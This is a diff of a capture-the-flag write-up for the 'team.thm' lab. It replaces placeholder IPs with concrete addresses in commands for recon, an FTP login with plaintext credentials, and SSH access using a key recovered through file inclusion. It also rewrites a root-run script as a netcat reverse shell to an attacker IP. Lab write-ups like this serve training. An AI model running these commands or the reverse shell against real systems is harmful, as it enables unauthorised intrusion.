@@ -9,7 +9,7 @@ key, then escalates through a sudo command injection and a root-owned writable c
 ## Reconnaissance
 
 ```bash
-nmap -sV -sC <target_ip>
+nmap -sV -sC 10.66.190.235
 ```
 
 Three open ports:
@@ -28,7 +28,7 @@ The default Apache page has no useful content, but viewing the page source revea
 domain name. Adding it to `/etc/hosts` loads the actual site:
 
 ```bash
-echo "<target_ip> team.thm" >> /etc/hosts
+echo "10.66.190.235 team.thm" >> /etc/hosts
 ```
 
 ### Web Enumeration
@@ -57,7 +57,7 @@ Logging in with the recovered credentials finds `New_site.txt`, which mentions a
 `.dev` subdomain and an SSH key:
 
 ```bash
-ftp <target_ip>
+ftp 10.66.190.235
 # login: ftpuser / T3@m$h@r3
 get New_site.txt
 ```
@@ -65,7 +65,7 @@ get New_site.txt
 Adding the subdomain to `/etc/hosts`:
 
 ```bash
-echo "<target_ip> dev.team.thm" >> /etc/hosts
+echo "10.66.190.235 dev.team.thm" >> /etc/hosts
 ```
 
 ### LFI - SSH Key Recovery
@@ -94,7 +94,7 @@ With the cleaned private key, SSH access as `dale` is straightforward:
 
 ```bash
 chmod 600 id_rsa
-ssh -i id_rsa dale@<target_ip>
+ssh -i id_rsa dale@10.66.190.235
 cat /home/dale/user.txt
 ```
 
@@ -133,7 +133,7 @@ Replacing the script content with a reverse shell:
 
 ```bash
 #!/bin/bash
-rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> 4444 >/tmp/f
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 10.66.114.230 4444 >/tmp/f
 ```
 
 On the attacker machine:
